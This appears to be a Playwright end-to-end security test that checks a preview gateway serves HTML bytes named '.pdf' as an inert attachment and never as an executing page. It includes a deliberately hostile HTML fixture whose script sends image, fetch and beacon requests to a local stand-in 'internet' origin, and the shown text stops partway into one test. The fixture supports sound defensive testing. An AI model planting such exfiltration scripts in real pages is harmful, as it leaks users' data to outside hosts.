/**
 * preview-pdf-toplevel.spec.ts — ADR-067 §13.1 test 58,
 * `TypeConfusion_HtmlNamedPdfDoesNotExecute` (FR-015, FR-015b, FR-016, AC-15.5).
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * WHY THIS FILE RUNS HEADED, AND WHY IT IS ONE OF ONLY TWO THAT DO
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * §0's derivation earns headed mode for exactly two cases, and this is one of
 * them: **headless Chromium has no PDF viewer**, so every top-level `.pdf`
 * navigation becomes a download and the page stays on `about:blank`. "No script
 * ran" is then true for the wrong reason — the browser never built a document at
 * all — and the test passes while proving nothing. That is not a hypothetical;
 * it is experiment §6A.1, where it invalidated a conclusion that had already
 * been written down.
 *
 * Measured again on this branch, 2026-09-10, with Playwright's own Chromium:
 *
 *   HEADED   top-level `application/pdf`, inline  → 200, no download,
 *                                                   `document.contentType`
 *                                                   `application/pdf`, and the
 *                                                   browser's own viewer
 *                                                   (`chrome-extension://…`)
 *                                                   mounts as a child frame
 *   HEADED   top-level `application/pdf`, attachment → `page.goto` rejects with
 *                                                   "Download is starting"; a
 *                                                   `download` event fires
 *
 * Both rows matter below, and the second is what the SHIPPED product produces.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * WHAT IS ACTUALLY BEING PROVED
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Type confusion is a file whose EXTENSION says one thing and whose BYTES say
 * another. §10.4 and FR-015/FR-015b answer it with one rule: **the extension
 * decides the `Content-Type`, never the bytes and never the host MIME registry**
 * — with `X-Content-Type-Options: nosniff` on every response so the browser is
 * not permitted to second-guess it either. `.pdf` is additionally NOT on §10.4's
 * inline allow-list, so the token path serves it as an ATTACHMENT (FR-008), and
 * an attachment never becomes a browser document at all (FR-018's mechanism).
 *
 * So the product holds the property TWICE OVER, and this file measures both
 * halves separately, because they fail separately:
 *
 *   58a  the shipped path — the gateway types HTML-bytes-named-`.pdf` as
 *        `application/pdf` from the extension table, sends `nosniff`, and pins
 *        the response to an attachment. Top-level in a real headed browser that
 *        is a DOWNLOAD, so no document exists to run anything.
 *   58b  the type rule STANDING ALONE — the same bytes served INLINE as
 *        `application/pdf` with `nosniff` and NO Content-Security-Policy at all.
 *        This is experiment §6A.3's measured cell, and it is the half with
 *        teeth: the browser DOES build something (it hands the bytes to its own
 *        PDF engine), and still nothing executes. It is the reason §10.4's
 *        `.pdf` row would remain safe even if the disposition were ever
 *        dropped, and it is why the answer is "content-type dispatch did the
 *        work; CSP contributed nothing".
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * EVERY NEGATIVE HERE HAS ITS CONTROLS IN THE SAME RUN — ALL THREE OF THEM
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * §13.1 test 58 requires a positive control; §0 requires a third one on top.
 * Both are here, and neither is decoration:
 *
 *   POSITIVE CONTROL   the SAME payload bytes, from the SAME origin, served as
 *                      `text/html` with no policy, MUST execute completely —
 *                      title `EVIL_EXECUTED`, the marker heading rendered, and
 *                      image + fetch + beacon all arriving at the second
 *                      origin. Without it, "nothing happened" is
 *                      indistinguishable from "the payload was never live",
 *                      which is exactly the trap experiment §6A.3's own control
 *                      existed to close.
 *   §0's THIRD CONTROL a GENUINE PDF served top-level in this same browser and
 *                      this same run MUST NOT download and MUST reach the
 *                      browser's own PDF viewer. §0: "a genuine PDF served at
 *                      top level must render in the same run, or the result is
 *                      INCONCLUSIVE rather than a pass." This is the assertion
 *                      that goes red the day someone runs this file headless,
 *                      or on a Chromium build with the PDF viewer compiled out
 *                      — the precise condition under which 58a and 58b would
 *                      pass for the wrong reason.
 *   NON-VACUITY        every gateway-served case additionally asserts the
 *                      RESPONSE BODY still contains the payload's marker. A 404
 *                      page also fails to execute.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * WHAT THE THIRD CONTROL DOES *NOT* ESTABLISH, STATED RATHER THAN IMPLIED
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * It establishes that the browser's own PDF path is LIVE — not a download, and
 * the viewer mounted. It does NOT verify the rendered pixels, and that is a
 * measured limitation rather than an omission: Chromium's PDF viewer draws
 * inside the `chrome-extension://mhjfbmdgcfjbbpaeojofohoefgiehjai/` document
 * behind a closed shadow root, and its `document.body.innerText` comes back
 * EMPTY for a perfectly rendered PDF and for a rejected one alike (measured
 * 2026-09-10, both cases, identical). A screenshot differential was considered
 * and rejected: it needs "two shots of the same page are byte-identical" as its
 * own non-vacuity guard, and an antialiasing wobble in that guard would be a
 * flake in a file pinned at `retries: 0`.
 *
 * Pixel-level proof that a PDF renders is covered where it IS measurable — the
 * PDF.js canvas, in preview-pdf.spec.ts and preview-pdf-viewer-control.spec.ts.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * GROUND TRUTH IS A SECOND ORIGIN'S REQUEST LOG, NEVER THE PAGE
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * The same rule the rest of this suite follows (experiment §4): what arrives at
 * a real HTTP server standing in for the internet was allowed; what never
 * arrives was blocked. Console text is explicitly not an oracle — the engines
 * word violations differently and a string match rots silently.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * RETRIES ARE ZERO, TWICE OVER
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * The `preview-headed` project in playwright.config.ts pins `retries: 0`, and
 * this file pins it again at file level so that running it under any other
 * project still cannot retry it. "The script did not execute" is not a property
 * a fourth attempt establishes; a security assertion allowed to retry reports
 * identically to one that passed first time.
 */
import {
  expect,
  request as playwrightRequest,
  test,
  type APIRequestContext,
  type Page,
} from '@playwright/test';
import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
import type { AddressInfo, Socket } from 'node:net';
import { expectedIsolationPolicy } from './fixtures/preview-isolation/policy-oracle.js';

// FILE-level retry pin. See the header: the second of two independent places
// that hold this at zero.
test.describe.configure({ retries: 0 });

const BASE_URL = process.env.OMNIPUS_URL || 'http://localhost:6060';
const AUTH_FILE = process.env.OMNIPUS_AUTH_FILE || './tests/e2e/fixtures/.auth/admin.json';

/**
 * The §10.3 policy this gateway must serve, byte for byte, on EVERY
 * preview-token response — including an attachment, which is the one place the
 * token path differs from the authenticated Library path (MV-13, §10.3's
 * "whatever the file's type").
 *
 * Read from the SPECIFICATION's own markdown, never from `pkg/gateway`: a test
 * that reads its expected value out of the implementation asserts only that the
 * implementation equals itself. See policy-oracle.ts's header.
 */
const ISOLATION_POLICY = expectedIsolationPolicy();

/**
 * Expected `Content-Type` values, from §10.4 and FR-015c.
 *
 * `.pdf` is in the type table (`libraryExtContentTypes`) but deliberately NOT on
 * the inline allow-list — the two sets are not the same thing, and this file is
 * where that distinction is measured end to end.
 */
const TYPE_PDF = 'application/pdf';
const TYPE_HTML = 'text/html; charset=utf-8';

/**
 * How long a page is given to leak before "nothing arrived" is believed.
 *
 * Load-bearing in one direction only: too SHORT and a negative passes because
 * the request had not been made yet. That is closed structurally rather than by
 * picking a big number — the positive control waits the SAME budget and must
 * SEE its traffic inside it, so a value that was ever too small turns the
 * control red first.
 */
const SETTLE_MS = 2_500;

/** The marker the payload sets on itself if it is ever EXECUTED. */
const EVIL_TITLE = 'EVIL_EXECUTED';
/** A string present in the payload BYTES, used as the non-vacuity oracle. */
const EVIL_MARKER_TEXT = 'IF YOU SEE THIS AS A PAGE, TYPE CONFUSION SUCCEEDED';

/**
 * Chromium's built-in PDF viewer, as it appears to the driver.
 *
 * MEASURED 2026-09-10 rather than assumed, and the measurement changed the
 * oracle: `document.querySelector('embed')` on the top-level document returns
 * NOTHING for a rendered PDF — the `<embed>` lives in a nested same-URL frame,
 * and the viewer UI itself is a `chrome-extension://` document. So the presence
 * of a `chrome-extension://` frame is what "the browser's own PDF viewer
 * mounted" actually looks like from here.
 *
 * The prefix is matched rather than Chrome's stable viewer id
 * (`mhjfbmdgcfjbbpaeojofohoefgiehjai`) so an id change cannot silently turn this
 * oracle blind. No ordinary gateway page has a `chrome-extension://` frame, so
 * the predicate is not loose in the direction that matters.
 */
function browserPdfViewerFrames(page: Page): string[] {
  return page.frames().map((f) => f.url()).filter((u) => u.startsWith('chrome-extension://'));
}

// ─────────────────────────────────────────────────────────────────────────────
// The second origin: a request sink that records what ARRIVES.
// ─────────────────────────────────────────────────────────────────────────────

interface Hit {
  path: string;
  method: string;
}

interface Sink {
  origin: string;
  hits: Hit[];
  close: () => Promise<void>;
}

/**
 * Start the stand-in-for-the-internet origin.
 *
 * Answers everything 200 with a permissive CORS header and records every
 * request, INCLUDING WebSocket upgrades — Node routes those to the `upgrade`
 * event and not to the request handler, and missing that event is how a probe
 * silently becomes "nothing arrived".
 */
async function startSink(): Promise<Sink> {
  const hits: Hit[] = [];
  const sockets = new Set<Socket>();
  const record = (req: IncomingMessage) => {
    hits.push({ path: (req.url || '').split('?')[0], method: req.method || 'GET' });
  };

  const server = createServer((req: IncomingMessage, res: ServerResponse) => {
    record(req);
    res.writeHead(200, {
      'Content-Type': 'text/plain',
      'Access-Control-Allow-Origin': '*',
      'Content-Length': '2',
    });
    res.end('ok');
  });
  server.on('upgrade', (req: IncomingMessage, socket: Socket) => {
    record(req);
    socket.destroy();
  });
  server.on('connection', (s: Socket) => {
    sockets.add(s);
    s.on('close', () => sockets.delete(s));
  });

  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = (server.address() as AddressInfo).port;
  return { origin: `http://127.0.0.1:${port}`, hits, close: () => closeServer(server, sockets) };
}

// ─────────────────────────────────────────────────────────────────────────────
// The control origin: the SAME bytes, served three different ways.
// ─────────────────────────────────────────────────────────────────────────────

interface ControlFile {
  body: Buffer;
  contentType: string;
  disposition: string;
}

interface ControlOrigin {
  origin: string;
  put: (name: string, file: ControlFile) => void;
  close: () => Promise<void>;
}

/**
 * Start the un-policed origin every control is served from.
 *
 * It mirrors the experiment's `server.py`: an explicit `Content-Type` chosen by
 * the TEST rather than by the extension, `nosniff` always, and NO
 * Content-Security-Policy at all. That last part is the point of 58b — the
 * property being measured there must hold with no policy in play, or it is not
 * the type rule that is holding it.
 *
 * Serving the controls here rather than by editing `pkg/gateway` is deliberate:
 * this suite does not own that package, and a test that edits the thing it is
 * testing proves nothing about what ships.
 */
async function startControlOrigin(): Promise<ControlOrigin> {
  const files = new Map<string, ControlFile>();

  const server = createServer((req: IncomingMessage, res: ServerResponse) => {
    const name = (req.url || '').split('?')[0].replace(/^\//, '');
    const file = files.get(name);
    if (!file) {
      res.writeHead(404, { 'Content-Type': 'text/plain', 'Content-Length': '9' });
      res.end('not found');
      return;
    }
    res.writeHead(200, {
      'Content-Type': file.contentType,
      'X-Content-Type-Options': 'nosniff',
      'Content-Disposition': file.disposition,
      'Content-Length': String(file.body.length),
      'Set-Cookie': 'omnipus_probe=SECRET; Path=/; SameSite=Strict',
    });
    res.end(file.body);
  });

  const sockets = new Set<Socket>();
  server.on('connection', (s: Socket) => {
    sockets.add(s);
    s.on('close', () => sockets.delete(s));
  });

  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = (server.address() as AddressInfo).port;
  return {
    origin: `http://127.0.0.1:${port}`,
    put: (name, file) => files.set(name, file),
    close: () => closeServer(server, sockets),
  };
}

function closeServer(server: Server, sockets: Set<Socket>): Promise<void> {
  for (const s of sockets) s.destroy();
  return new Promise<void>((resolve) => server.close(() => resolve()));
}

// ─────────────────────────────────────────────────────────────────────────────
// The payload. ONE builder for the hostile case and for every control.
// ─────────────────────────────────────────────────────────────────────────────

/**
 * The exfiltration script the payload carries, parameterised only by the sink
 * URL prefix it reports to.
 *
 * ONE builder on purpose: a passing control and a failing negative must not be
 * explainable by "different fixtures". The only thing that differs between a
 * case and its control is the `caseTag`, which segregates the hit log so a late
 * beacon from an earlier test can never be counted against a later one.
 *
 * Three vectors, not seven. This file is about CONTENT-TYPE DISPATCH, not about
 * the §10.3 policy — the seven-vector matrix is preview-isolation.spec.ts's
 * subject. Three arriving in the positive control is already conclusive for the
 * assertion these tests make, which is that the list is EMPTY.
 */
function exfilScript(sinkOrigin: string, caseTag: string): string {
  return `
(function(){
  var U = function(v){ return ${JSON.stringify(sinkOrigin)} + "/x/${caseTag}/" + v; };
  document.title = ${JSON.stringify(EVIL_TITLE)};
  try { new Image().src = U("img"); } catch (e) {}
  try { fetch(U("fetch"), { mode: "no-cors" }).catch(function(){}); } catch (e) {}
  try { navigator.sendBeacon(U("beacon"), "x"); } catch (e) {}
})();
`;
}

/**
 * An HTML document that announces itself loudly if it is ever EXECUTED.
 *
 * The `document.title = "EVIL_EXECUTED"` marker and the cookie/beacon shape are
 * kept identical to the committed experiment fixture
 * (`docs/internal/experiments/preview-isolation/fixture2/evil.pdf`) that
 * measured §6A.3's result, so a future reader can line this file up against that
 * measurement directly.
 */
function evilHtml(sinkOrigin: string, caseTag: string): string {
  return `<!doctype html><html><head><meta charset="utf-8"><title>inert</title></head><body>
<h1 id="evil-marker">${EVIL_MARKER_TEXT}</h1>
<script>
${exfilScript(sinkOrigin, caseTag)}
</script>
</body></html>
`;
}

/**
 * Assemble numbered objects into a structurally valid PDF with a real xref
 * table.
 *
 * Everything is latin1, so string length equals byte length and the offsets are
 * exact. A PDF whose xref is wrong is still readable by some engines (they
 * reconstruct it), which would make a broken fixture look like a working one —
 * and this fixture's whole job is to be unambiguously genuine.
 */
function buildPdf(objects: string[]): Buffer {
  const header = '%PDF-1.7\n%\xE2\xE3\xCF\xD3\n';
  let body = '';
  const offsets: number[] = [];
  objects.forEach((obj, i) => {
    offsets.push(header.length + body.length);
    body += `${i + 1} 0 obj\n${obj}\nendobj\n`;
  });
  const xrefOffset = header.length + body.length;
  let xref = `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  for (const off of offsets) xref += `${String(off).padStart(10, '0')} 00000 n \n`;
  const trailer =
    `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\n` +
    `startxref\n${xrefOffset}\n%%EOF\n`;
  return Buffer.from(header + body + xref + trailer, 'latin1');
}

function contentStream(content: string): string {
  return `<< /Length ${Buffer.byteLength(content, 'latin1')} >>\nstream\n${content}\nendstream`;
}

/**
 * A genuine, single-page PDF — §0's third control.
 *
 * It draws a FILLED BLACK RECTANGLE as well as text, so that "something was
 * painted" would not depend on which fonts the host happens to have installed.
 * (The rectangle is not read by this file — see the header on what is and is
 * not measurable through Chromium's viewer — but it keeps the fixture usable as
 * a genuine document by any renderer that IS readable.)
 */
function genuinePdf(): Buffer {
  return buildPdf([
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 200] ' +
      '/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>',
    contentStream('0 0 0 rg\n20 150 260 30 re f\nBT /F1 28 Tf 20 60 Td (OMNIPUS PDF) Tj ET\n'),
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
  ]);
}

// ─────────────────────────────────────────────────────────────────────────────
// Gateway plumbing: workspace, fixture upload, one preview token.
// ─────────────────────────────────────────────────────────────────────────────

/** Library-relative directory this spec owns. Fixed, and wiped before use. */
const FIXTURE_DIR = 'e2e-preview-pdf-toplevel';

/** HTML bytes under a `.pdf` name — the case §13.1 test 58 names. */
const FILE_CONFUSED_PDF = 'confused.pdf';
/** A real PDF, so the type table's `.pdf` row is exercised on honest bytes too. */
const FILE_GENUINE_PDF = 'genuine.pdf';
/** An entry the bundle token is minted against. */
const FILE_INDEX_HTML = 'index.html';

let sink: Sink;
let control: ControlOrigin;
let api: APIRequestContext;
let workspaceID: string;
let previewToken: string;

function tokenURL(name: string): string {
  return `/library-preview/${previewToken}/${FIXTURE_DIR}/${name}`;
}

function tokenHref(name: string): string {
  return `${BASE_URL}${tokenURL(name)}`;
}

/**
 * The double-submit CSRF echo every state-changing call needs.
 *
 * `APIRequestContext` carries the cookie jar automatically, but the gateway
 * additionally requires the same csrf value back as a header — see
 * pkg/gateway/middleware/csrf.go.
 */
async function csrfHeaders(ctx: APIRequestContext): Promise<Record<string, string>> {
  const state = await ctx.storageState();
  const cookie = state.cookies.find((c) => c.name === 'csrf' || c.name === '__Host-csrf');
  return cookie ? { 'X-CSRF-Token': cookie.value } : {};
}

test.beforeAll(async () => {
  sink = await startSink();
  control = await startControlOrigin();

  api = await playwrightRequest.newContext({ baseURL: BASE_URL, storageState: AUTH_FILE });
  const csrf = await csrfHeaders(api);

  const wsRes = await api.get('/api/v1/library/workspaces');
  expect(wsRes.status(), 'GET /api/v1/library/workspaces').toBe(200);
  const workspaces = (await wsRes.json()) as Array<{ id: string; name: string }>;
  expect(
    workspaces.length,
    'no workspace with a work tree exists — the Library preview path cannot be exercised',
  ).toBeGreaterThan(0);
  workspaceID = workspaces[0].id;

  // Wipe then recreate, so a rerun is idempotent and a stale byte from an
  // earlier run can never be the thing under test. Deleting first also revokes
  // any preview token still live over the path (FR-003d).
  await api.delete(
    `/api/v1/library/${workspaceID}/entries?path=${encodeURIComponent(FIXTURE_DIR)}`,
    { headers: csrf },
  );
  const mkdir = await api.post(`/api/v1/library/${workspaceID}/mkdir`, {
    headers: { ...csrf, 'Content-Type': 'application/json' },
    data: { path: FIXTURE_DIR },
  });
  expect(mkdir.status(), `mkdir ${FIXTURE_DIR}: ${await mkdir.text()}`).toBeLessThan(300);

  const evilForPdfName = evilHtml(sink.origin, 'confusedpdf');

  const upload = await api.post(
    `/api/v1/library/${workspaceID}/upload?path=${encodeURIComponent(FIXTURE_DIR)}`,
    {
      headers: csrf,
      multipart: {
        // NOTE the mimeType declared on the MULTIPART PART is a lie on purpose:
        // it claims text/html for bytes stored under a `.pdf` name. FR-015b says
        // the SERVED type comes from the extension table and from nothing else,
        // so an implementation that remembered the upload's declared type would
        // answer text/html here and fail the assertions below.
        f0: {
          name: FILE_CONFUSED_PDF,
          mimeType: 'text/html',
          buffer: Buffer.from(evilForPdfName),
        },
        f1: { name: FILE_GENUINE_PDF, mimeType: TYPE_PDF, buffer: genuinePdf() },
        f2: {
          name: FILE_INDEX_HTML,
          mimeType: 'text/html',
          buffer: Buffer.from(
            '<!doctype html><html><body><p id="bundle-entry">pdf toplevel fixture</p></body></html>',
          ),
        },
      },
    },
  );
  expect(upload.status(), `upload fixtures: ${await upload.text()}`).toBeLessThan(300);

  // The control origin serves the SAME payload bytes three ways. Only the
  // headers differ, which is what makes any difference in outcome attributable
  // to the headers and to nothing else.
  control.put('evil-as-pdf.pdf', {
    body: Buffer.from(evilHtml(sink.origin, 'inlinepdf')),
    contentType: TYPE_PDF,
    disposition: 'inline',
  });
  control.put('evil-as-html.html', {
    body: Buffer.from(evilHtml(sink.origin, 'ctrlhtml')),
    contentType: TYPE_HTML,
    disposition: 'inline',
  });
  control.put('genuine.pdf', {
    body: genuinePdf(),
    contentType: TYPE_PDF,
    disposition: 'inline',
  });

  // ONE token for the whole directory. Bundle scope, so every fixture above is
  // reachable through it — and, just as importantly, only ONE credential is
  // minted per run: the store caps live tokens per session at eight (FR-003k).
  const mint = await api.post('/api/v1/library/preview-token', {
    headers: { ...csrf, 'Content-Type': 'application/json' },
    data: {
      workspace_id: workspaceID,
      path: FIXTURE_DIR,
      scope: 'bundle',
      entry_path: FILE_INDEX_HTML,
    },
  });
  // 201, from contracts/openapi.yaml's `/library/preview-token` — the only
  // success status that operation declares.
  expect(mint.status(), `mint preview token: ${await mint.text()}`).toBe(201);
  const minted = (await mint.json()) as { token: string; url: string };
  previewToken = minted.token;
  expect(previewToken, 'minted token must be the 43-char base64url shape (FR-003h)').toHaveLength(43);
});

test.afterAll(async () => {
  if (api) {
    const csrf = await csrfHeaders(api);
    await api
      .delete(`/api/v1/library/${workspaceID}/entries?path=${encodeURIComponent(FIXTURE_DIR)}`, {
        headers: csrf,
      })
      .catch(() => undefined);
    await api.dispose();
  }
  await sink?.close();
  await control?.close();
});

// ─────────────────────────────────────────────────────────────────────────────
// Hit-log helpers. The only oracle for egress.
// ─────────────────────────────────────────────────────────────────────────────

/**
 * A watermark into the hit log, taken at the start of a test.
 *
 * Case tags segregate one payload from another; this segregates one RUN from
 * the next. A stale hit counted against a later test is a false RED; the same
 * mechanism the other way round would be a false GREEN.
 */
function mark(): number {
  return sink.hits.length;
}

/** Every vector name recorded for one case tag since `from`, in arrival order. */
function arrived(caseTag: string, from: number): string[] {
  const prefix = `/x/${caseTag}/`;
  return sink.hits
    .slice(from)
    .filter((h) => h.path.startsWith(prefix))
    .map((h) => h.path.slice(prefix.length));
}

/** Wait until every named vector has arrived, or the settle budget expires. */
async function waitForVectors(
  caseTag: string,
  from: number,
  wanted: readonly string[],
): Promise<string[]> {
  const deadline = Date.now() + SETTLE_MS;
  for (;;) {
    const got = arrived(caseTag, from);
    if (wanted.every((v) => got.includes(v))) return got;
    if (Date.now() > deadline) return got;
    await new Promise((r) => setTimeout(r, 50));
  }
}

/** Spend the FULL settle budget, then report what arrived. The negative oracle. */
async function settleThenRead(caseTag: string, from: number): Promise<string[]> {
  await new Promise((r) => setTimeout(r, SETTLE_MS));
  return arrived(caseTag, from);
}

/** The three vectors the payload fires unconditionally. */
const VECTORS = ['img', 'fetch', 'beacon'] as const;

/**
 * Read the type-confusion markers out of whatever document the browser built.
 *
 * Returns nulls rather than throwing when there is no document to read — the
 * attachment case leaves the page on `about:blank`, and that is a legitimate
 * outcome to assert on rather than an error.
 */
async function readExecutionMarkers(
  page: Page,
): Promise<{ contentType: string | null; title: string | null; markerCount: number | null }> {
  try {
    return await page.evaluate(() => ({
      contentType: document.contentType,
      title: document.title,
      markerCount: document.querySelectorAll('#evil-marker').length,
    }));
  } catch {
    return { contentType: null, title: null, markerCount: null };
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────────────

test.describe('ADR-067 test 58 — HTML bytes named .pdf, top level, headed Chromium', () => {
  /**
   * 58a — THE SHIPPED PATH.
   *
   * FR-015/FR-015b (the extension decides the type, never the bytes), FR-008 and
   * §10.4 (`.pdf` is deliberately absent from the inline allow-list, so it is an
   * attachment), and MV-13's token-path half (an ATTACHMENT on the token path
   * still carries the §10.3 policy, unlike one on the authenticated path).
   *
   * The payload's bytes begin `<!doctype html>`, and the multipart upload
   * additionally DECLARED them `text/html`. A sniffing implementation, or one
   * that remembered the upload's declared type, answers `text/html` here and a
   * real browser then executes a real document.
   */
  test('58a — the gateway types it by EXTENSION, refuses to make it a document, and nothing leaks', async ({
    page,
  }) => {
    const from = mark();

    // ── The response, before any browser sees it ─────────────────────────────
    const res = await api.get(tokenURL(FILE_CONFUSED_PDF));
    expect(res.status()).toBe(200);
    const h = res.headers();
    expect(
      h['content-type'],
      'a sniffing implementation — or one that trusted the upload\'s declared type — answers text/html here',
    ).toBe(TYPE_PDF);
    expect(h['x-content-type-options']).toBe('nosniff');
    expect(
      h['content-disposition'],
      '§10.4: `.pdf` is deliberately absent from the inline allow-list (FR-008), so the token path must send an attachment',
    ).toMatch(/^attachment/);
    expect(
      h['content-security-policy'],
      'MV-13: every response on the preview-token path carries the §10.3 policy, WHATEVER the file\'s type — an attachment included',
    ).toBe(ISOLATION_POLICY);

    // NON-VACUITY. Everything below is a claim about what the browser does with
    // THESE BYTES. A 404 page also fails to execute.
    expect(
      await res.text(),
      'the gateway served something other than the hostile payload — every negative below would be vacuous',
    ).toContain(EVIL_MARKER_TEXT);

    // ── The same URL, opened top-level in a REAL headed browser ──────────────
    const downloads: string[] = [];
    page.on('download', (d) => downloads.push(d.suggestedFilename()));

    let navigationError: string | null = null;
    try {
      await page.goto(tokenHref(FILE_CONFUSED_PDF));
    } catch (e) {
      navigationError = String(e).split('\n')[0];
    }

    // An attachment cannot become a document, so the browser downloads it. That
    // IS the property FR-018 rests on — measured end to end rather than inferred
    // from the header, because a header nobody has watched a browser obey is a
    // claim about a string.
    expect(
      downloads,
      `a Content-Disposition: attachment response must download rather than render (goto said: ${navigationError ?? 'no error'})`,
    ).toContain(FILE_CONFUSED_PDF);

    // Stated honestly: with the page still on about:blank, these two are true
    // BECAUSE no document was built. They are asserted anyway — they are what
    // would go red if a future change made this response inline — but they are
    // NOT this file's proof that the payload is inert. 58b is.
    const markers = await readExecutionMarkers(page);
    expect(markers.title ?? '', 'the payload must never have executed').not.toBe(EVIL_TITLE);
    expect(markers.markerCount ?? 0, 'the payload must never have rendered as a document').toBe(0);

    // GROUND TRUTH.
    const got = await settleThenRead('confusedpdf', from);
    expect(got, `the type-confused payload reached the second origin: ${got.join(', ')}`).toEqual([]);
  });

  /**
   * 58b — THE TYPE RULE, STANDING ALONE. Experiment §6A.3's measured cell.
   *
   * The same payload bytes, served INLINE as `application/pdf` with `nosniff`
   * and **no Content-Security-Policy at all**, over a real socket. The browser
   * therefore DOES build a document — it hands the bytes to its own PDF engine —
   * and this is the case with teeth, because "nothing ran" here cannot be
   * explained by "nothing was loaded".
   *
   * The experiment's conclusion, re-measured here: *content-type dispatch did
   * the work; CSP contributed nothing.* That is why §10.4's `.pdf` row would
   * stay safe even if the disposition assertion in 58a were ever traded away.
   */
  test('58b — served INLINE as application/pdf with no policy at all, the payload still does not execute', async ({
    page,
  }) => {
    const from = mark();
    const response = await page.goto(`${control.origin}/evil-as-pdf.pdf`);
    expect(response, 'navigation produced no response').not.toBeNull();
    expect(response!.status()).toBe(200);
    expect(
      response!.headers()['content-security-policy'],
      'this cell must carry NO policy — otherwise it measures the policy, not the type',
    ).toBeUndefined();
    expect(response!.headers()['content-type']).toBe(TYPE_PDF);

    const markers = await readExecutionMarkers(page);

    // The browser really did route these bytes to its PDF engine rather than
    // ignoring the response: that is what makes "no script ran" a measurement of
    // dispatch rather than of a failed load.
    expect(
      markers.contentType,
      'the document must have been dispatched by its declared type, not by its bytes',
    ).toBe(TYPE_PDF);
    expect(markers.title ?? '', 'the HTML payload executed inside the PDF context').not.toBe(EVIL_TITLE);
    expect(markers.markerCount ?? 0, 'the HTML payload rendered as a document').toBe(0);

    const got = await settleThenRead('inlinepdf', from);
    expect(
      got,
      `HTML bytes typed application/pdf reached the second origin — content-type dispatch did NOT contain them: ${got.join(', ')}`,
    ).toEqual([]);
  });

  /**
   * THE POSITIVE CONTROL §13.1 test 58 requires by name.
   *
   * The same bytes, the same origin, the same sink, served as `text/html` with
   * no policy. Everything above is worthless without this: an inert payload, a
   * sink nobody can reach, or a browser that silently dropped the script all
   * produce exactly the same empty hit list as perfect containment.
   */
  test('58 positive control — the same bytes served as text/html DO execute and DO reach the second origin', async ({
    page,
  }) => {
    const from = mark();
    await page.goto(`${control.origin}/evil-as-html.html`);

    await expect
      .poll(async () => page.title(), { timeout: SETTLE_MS })
      .toBe(EVIL_TITLE);
    expect(
      await page.locator('#evil-marker').count(),
      'the payload did not even render — 58a and 58b would then assert nothing',
    ).toBe(1);

    const got = await waitForVectors('ctrlhtml', from, VECTORS);
    expect(
      got,
      'the payload or the sink is broken — an un-policed HTML payload must leak, or every negative in this file is vacuous',
    ).toEqual(expect.arrayContaining([...VECTORS]));
  });

  /**
   * §0's THIRD CONTROL — and the single assertion that makes this file worth
   * running headed.
   *
   * §0, in full: *"That case also needs a third control: a genuine PDF served at
   * top level must render in the same run, or the result is INCONCLUSIVE rather
   * than a pass."*
   *
   * Run headless, this test FAILS — `page.goto` rejects with "Download is
   * starting", no viewer frame ever appears (measured 2026-09-10). That is
   * precisely the state in which 58a and 58b would pass for the wrong reason, so
   * this is the tripwire under both of them, not a completeness exercise.
   *
   * Scope, stated rather than implied: this establishes that the browser's own
   * PDF path is LIVE — the navigation is not a download and the viewer mounted.
   * It does not verify pixels; see the file header for the measurement behind
   * that limitation and for where pixel-level proof does live.
   */
  test('58 third control (§0) — a GENUINE pdf top-level is not a download, and the browser\'s own PDF viewer mounts', async ({
    page,
  }) => {
    const downloads: string[] = [];
    page.on('download', (d) => downloads.push(d.suggestedFilename()));

    const response = await page.goto(`${control.origin}/genuine.pdf`);
    expect(
      response,
      'a genuine inline PDF produced no response at top level — this browser has no working PDF path, ' +
        'so 58a and 58b are INCONCLUSIVE rather than passes (§0). Is this running headless?',
    ).not.toBeNull();
    expect(response!.status()).toBe(200);
    expect(
      downloads,
      'the genuine PDF was DOWNLOADED rather than rendered — the headless artefact §0 warns about. ' +
        '58a and 58b are inconclusive in this configuration.',
    ).toEqual([]);

    const markers = await readExecutionMarkers(page);
    expect(markers.contentType, 'the PDF must be dispatched as application/pdf').toBe(TYPE_PDF);

    // The oracle, measured rather than assumed — see browserPdfViewerFrames.
    await expect
      .poll(() => browserPdfViewerFrames(page).length, {
        timeout: 20_000,
        message:
          'the browser\'s own PDF viewer never mounted. Headless Chromium has no PDF viewer at all, ' +
          'which is the exact configuration in which "no script ran" is true for the wrong reason (§0, experiment §6A.1). ' +
          'Run this file under the `preview-headed` project.',
      })
      .toBeGreaterThan(0);

    // …and it is the BROWSER'S viewer, not something the page built for itself.
    // Belt and braces on the same observation: a `chrome-extension://` document
    // cannot be created by page content.
    expect(browserPdfViewerFrames(page)[0]).toMatch(/^chrome-extension:\/\/[a-p]{32}\//);
  });

  /**
   * The other half of §0's third control, aimed at the PRODUCT rather than at a
   * static origin: the gateway's own genuine PDF.
   *
   * It must be typed `application/pdf` from the extension table and served as an
   * ATTACHMENT — so the browser's PDF viewer, which the test above just proved
   * is live and would happily render it, never gets the chance. That is FR-018's
   * mechanism stated as a measurement: *"a PDF never becomes a browser document
   * at all"*.
   *
   * This is the assertion that turns red if `.pdf` is ever added to §10.4's
   * inline allow-list — the change 58b shows would still be *safe*, but which
   * §10.4 and FR-018 have decided against, and which must not happen silently.
   */
  test('58d — a GENUINE pdf on the token path is an attachment, so the browser\'s viewer never receives it', async ({
    page,
  }) => {
